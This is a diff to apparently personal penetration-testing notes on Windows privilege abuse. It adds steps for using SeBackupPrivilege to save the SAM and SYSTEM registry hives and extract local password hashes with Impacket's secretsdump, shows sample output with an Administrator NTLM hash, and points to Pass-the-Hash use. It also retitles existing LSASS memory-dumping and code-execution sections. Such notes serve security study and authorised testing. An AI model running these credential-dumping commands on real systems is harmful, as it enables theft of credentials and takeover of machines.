@@ -100,6 +100,14 @@ ___
 ## SeBackupPrivilege
 
 [SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
+allows to
+
+- Read access to any file
+- Read the password hashes of local Administrator
+
+**READ FILE CONTENT**
+
+[SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
 allows to traverse any folder and list the folder contents
 
 1. Import [SeBackupPrivilege POC](https://github.com/giuliano108/SeBackupPrivilege)
@@ -189,6 +197,66 @@ Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
 > ```
 <!-- }}} -->
 
+**EXPORT REGISTRY HIVES**
+
+[SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
+allows access to  [[Registry]] hives
+
+1. Export `SYSTEM` and `SAM` registry hives
+
+```sh
+reg save hklm\sam sam
+```
+
+```sh
+reg save hklm\system system
+```
+
+2. [[Impacket]] - [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) —
+Extract hashes on the attacker machine
+
+```sh
+impacket-secretsdump -sam sam -system system local
+```
+
+<!-- Info {{{-->
+> [!info]-
+>
+> - `-sam`: Path to the `SAM` file, containing encrypted password data
+> - `-system`: Path to the `SYSTEM` file, containing the boot key
+>   required to decrypt the SAM file
+> - `local`: Local file that is not being accessed remotely
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> impacket-secretsdump -sam sam -system system local
+> ```
+> ```sh
+> Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+> [*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+> Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f3
+> 41:::
+> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
+> 9c0:::
+> [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't
+> have hash information.
+> [*] Cleaning up...
+> ```
+> The `Administrator`'s [[NTLM]] hash is `2b87e7c93a3e8a0ea4a581937016f341`
+<!-- }}} -->
+
+<!-- Tip {{{-->
+> [!tip]
+>
+> The exported hashes can be used in Pass-the-Hash attacks
+> - [[WinRM/Exploitation#Pass-the-Hash|WinRM]]
+<!-- }}} -->
+
 ___
 <!-- }}} -->
 
@@ -198,7 +266,7 @@ ___
 `SeDebugPrivilege` privilege allows to debug other processes,
 including to read and write their memory
 
-**Dump Memory**
+**DUMP MEMORY**
 
 1. Dump process memory (*e.g., [[Processes/Processes#LSASS|LSASS]]*)
 
@@ -324,7 +392,7 @@ sekurlsa::logonpasswords
 > ```
 <!-- }}} -->
 
-**Remote Code Execution (RCE)**
+**REMOTE CODE EXECUTION (RCE)**
 
 1. [tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) —
 [[Processes#Identify|Identify]] processes running as `SYSTEM`
